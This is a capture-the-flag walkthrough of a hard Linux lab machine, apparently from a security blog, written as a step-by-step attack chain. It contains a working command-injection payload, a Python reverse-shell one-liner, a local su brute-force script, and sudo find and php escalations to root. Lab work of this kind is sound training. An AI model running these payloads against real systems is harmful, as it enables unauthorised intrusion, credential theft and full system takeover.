
<img src="/budahacksecurity/uploads/md_images/hc/hc9.png" style="max-width:100%; border-radius:8px;">



## Description

Hard difficulty Linux machine. The intrusion begins by enumerating an HTTP port where a hidden web application vulnerable to **Command Injection** is discovered, allowing us to obtain a reverse shell as `www-data`. Inside the system we find a wordlist in a user's directory, which allows us to perform local brute force and escalate to `e1i0t`. Using a `find` binary with `sudo` permissions we escalate to `an0n1mat0`, where we find a file with partial passwords. We generate a wordlist with `crunch` and use `hydra` to obtain the full password. Finally, we escalate to `root` by leveraging `sudo` permissions over `php`.

---

## Attack Chain

```
RCE (Command Injection)
        ↓
Reverse shell as www-data
        ↓
Wordlist at /home/e1i0t/documents/agenda_passwords.txt
        ↓
Local brute force with su → e1i0t:eliotelmejor
        ↓
sudo find -exec /bin/bash → shell as an0n1mat0
        ↓
/usr/local/bin/passwords_users.txt → partial password XXyanonymous
        ↓
crunch + hydra → full password for an0n1mat0
        ↓
sudo php -r 'system("/bin/bash -i")' → root
```

---
### Enumeration

We start the machine with a port scan:

```bash
scapot -t 172.17.0.2 -m top -b
```

- `-t` → IP address
- `-m` → scan mode. `top` scans the most common ports
- `-b` → to request service versions

Output:

```
  ______           _______              __
 /      \         /       \            /  |
/$$$$$$  |  _______   ______  $$$$$$$  | ______   _$$ |_
$$ \__$$/  /       | /      \ $$ |__$$ |/      \ / $$   |
$$      \ /$$$$$$$/  $$$$$$  |$$    $$//$$$$$$  |$$$$$$/
 $$$$$$  |$$ |       /    $$ |$$$$$$$/ $$ |  $$ |  $$ | __
/  \__$$ |$$ \_____ /$$$$$$$ |$$ |     $$ \__$$ |  $$ |/  |
$$    $$/ $$       |$$    $$ |$$ |     $$    $$/   $$  $$/
 $$$$$$/   $$$$$$$/  $$$$$$$/ $$/       $$$$$$/     $$$$/


[+] Valid IP address -> 172.17.0.2
=== Scanning Top 90 ports ===

[*] Starting scan...
[*] Version detection enabled (-b)
[00:00:00] [████████████████████████████████████████████▓] 88/90 ports (0s)
[+] Port 22     | SSH             | SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.4

[+] Port 80     | HTTP            | Apache/2.4.58 (Ubuntu)

═══════════════════════════════════════════════════
 Scan completed | 2 open port(s)
═══════════════════════════════════════════════════
  ► 22     │ SSH             │ SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.4
  ► 80     │ HTTP            │ Apache/2.4.58 (Ubuntu)
═══════════════════════════════════════════════════
 Detected OS  │ Linux/Unix
═══════════════════════════════════════════════════
```

We observe that there are 2 open ports on the target machine. We use nmap's `NSE` scripts to enumerate in more detail:

```bash
nmap -p22,80 -Pn -n -sSVC --min-rate 5000 172.17.0.2
```

Output:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 05:48:9d:f6:29:e1:dd:c4:f6:18:87:ff:13:15:5a:80 (ECDSA)
|_  256 0a:3d:0d:c3:fe:4e:57:8a:de:1f:5f:3c:8e:92:e9:5b (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: HackMeDaddy - Ethical Hacking
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-robots.txt: 3 disallowed entries
|_/FLAG.txt /joomla/* /secret/
MAC Address: EE:47:A9:8E:35:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We don't find anything relevant at the moment.

**Port 80/HTTP Enumeration**

Visiting the web application we observe that it is a simulated environment for practicing ethical hacking.

<img src="/budahacksecurity/uploads/md_images/hc/hc.png" style="max-width:100%; border-radius:8px;">


Reviewing the source code we find a sequence of files:

```
command: 'cat README.txt', output: 'd05notfound exploit payload shell bruteforce vulnerability cipher zero-day phishing root port_scan firewall backdoor'
```

### Intrusion

Testing the `d05notfound` file we come across a hidden web application with a control panel where we can perform ping checks:

<img src="/budahacksecurity/uploads/md_images/hc/hc2.png" style="max-width:100%; border-radius:8px;">


Reviewing the source code we see that the ping executed successfully.

<img src="/budahacksecurity/uploads/md_images/hc/hc3.png" style="max-width:100%; border-radius:8px;">


With this result we can say that the command being executed internally is `ping -c 4`. Since the user input can execute internal system commands, we are going to test command injection to obtain RCE. For that we will use Burp Suite:

<img src="/budahacksecurity/uploads/md_images/hc/hc4.png" style="max-width:100%; border-radius:8px;">

```bash
127.0.0.1${IFS}|${IFS}cat${IFS}/etc/passwd
```

We observe that we obtain RCE, remote code execution on the system. We are going to obtain a reverse shell:

We set up a listener:

```bash
pwncat-cs -lp 4444
```

We launch the payload and obtain our system shell:

```python
172.17.0.1|python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

We enumerate system users:

```bash
run enumerate.user
```

<img src="/budahacksecurity/uploads/md_images/hc/hc7.png" style="max-width:100%; border-radius:8px;">


In `e1i0t`'s directory we find a note that says:

```
(remote) www-data@8138ec6f2da4:/home/e1i0t$ cat nota.txt
Reminder:

Delete my passwords from the agenda, I don't want to screw up with the boss again.

By e1i0t
```

We find a wordlist with possible passwords for `e1i0t`:

```
/home/e1i0t/documents/agenda.txt
```

I will use my script to perform local brute force:

```bash
cat > /tmp/force.sh << 'EOF'
#!/bin/bash

host="127.0.0.1"
user="e1i0t"
dictionary="/home/e1i0t/documents/agenda.txt"
delay=0

trap "echo '[!] Aborted by user'; exit 1" SIGINT SIGTERM

echo "[*] Starting stealthy brute-force against $host"
echo "[*] User: $user"
echo "[*] Delay: ${delay}s between attempts"
echo ""

while IFS= read -r password; do
    result=$(su -c "whoami" "$user" <<< "$password" 2>/dev/null)

    if [ "$result" = "$user" ]; then
        echo "[+] PASSWORD FOUND: $password"
        exit 0
    else
        echo "[-] Failed: $password"
    fi

    sleep $delay

done < "$dictionary"

echo "[-] Wordlist exhausted with no results"
EOF
```

Password found:

```
[+] PASSWORD FOUND: eliotelmejor
```

We can observe that we can execute the `find` command as user `an0n1mat0` without needing their password. We obtain a shell as `an0n1mat0`:

```bash
sudo -u an0n1mat0 find / -maxdepth 1 -exec /bin/bash \;
```

Reviewing the `passwords_users.txt` file we find the passwords for all 3 users, but `root`'s doesn't work since it is mentioned that there are outdated passwords, and `an0n1mat0`'s needs to be completed:

```
an0n1mat0@8138ec6f2da4:/secret$ cat /usr/local/bin/passwords_users.txt

User passwords:

e1i0t:eliotelmejor
an0n1mat0:XXyanonymous
root:root

There are some outdated passwords, but I don't remember an0n1mat0's entire password, I know that where the two
```

We will use the `crunch` tool to create a wordlist with the possible full passwords for `an0n1mat0`:

```bash
┌──(root㉿a9ccd9df1d27)-[/home/Desktop]
└─# crunch 12 12 abcdefghijklmnopqrstuvwxyz -o diccionario.txt -t @@yanonymous
Crunch will now generate the following amount of data: 8788 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 676
```

 use `hydra` to obtain the user's password:

<img src="/budahacksecurity/uploads/md_images/hc/hc8.png" style="max-width:100%; border-radius:8px;">


#### Getting root

Checking if the user can execute any service with `sudo` we find:

```
an0n1mat0@8138ec6f2da4:/secret$ sudo -l
[sudo] password for an0n1mat0:
Matching Defaults entries for an0n1mat0 on 8138ec6f2da4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User an0n1mat0 may run the following commands on 8138ec6f2da4:
    (ALL : ALL) /bin/php
```

It can execute `php`, so we obtain a root shell and complete the machine:

```bash
an0n1mat0@8138ec6f2da4:/secret$ sudo /bin/php -r 'system("/bin/bash -i");'
root@8138ec6f2da4:/secret# id
uid=0(root) gid=0(root) groups=0(root)
```